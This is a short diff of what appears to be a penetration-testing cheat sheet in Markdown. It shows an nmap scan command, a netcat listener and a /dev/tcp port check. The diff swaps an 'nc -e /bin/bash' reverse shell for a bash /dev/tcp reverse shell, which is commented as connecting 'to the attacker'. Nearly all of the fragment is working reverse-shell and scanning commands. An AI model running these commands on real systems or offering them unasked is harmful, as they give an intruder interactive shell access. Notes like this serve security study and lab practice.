@@ -13,7 +13,8 @@ nmap -v -sV -T5 -p 21,22,80 [host]
 ### Reverse shell dev/tcp
 ```bash
 nc -vlnp 4444
-nc localhost 4444 -e /bin/bash
+# connect to the attacker from other terminal linux
+bash -i >& /dev/tcp/localhost/4444 0>&1
 
 timeout 0.5 echo 2>/dev/null < /dev/tcp/localhost/80 && echo "open" || echo "closed"
 
